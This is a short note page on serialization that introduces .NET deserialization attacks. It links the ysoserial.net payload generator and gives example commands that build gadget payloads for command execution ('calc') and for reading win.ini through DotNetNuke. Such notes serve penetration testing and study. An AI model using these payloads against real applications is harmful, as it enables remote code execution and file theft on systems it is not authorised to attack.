# Serialization

### Notes
- Purpose is to convert a data structure into a format that can be stored or transmitted over a network link for future consumption.
- Involves a "producer" and a "consumer" of the serialized object. 
- E.g. An application can define and instantiate an arbitrary object and modify its state in some way. It can then store the state of that object in the appropriate format (for example a binary file) using serialization. As long as the format of the saved file is understood by the "consumer" application, the object can be recreated in the process space of the consumer and further processed as desired.
- There are various formats in which the serialized objects can be stored such as JSON and XML.

### .NET Serialization

**Tools**

* [pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters](https://github.com/pwntester/ysoserial.net)
```ps1
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

**Formatters**

![NETNativeFormatters.png](/img/dotnet-native-formatters.png?raw=true)    
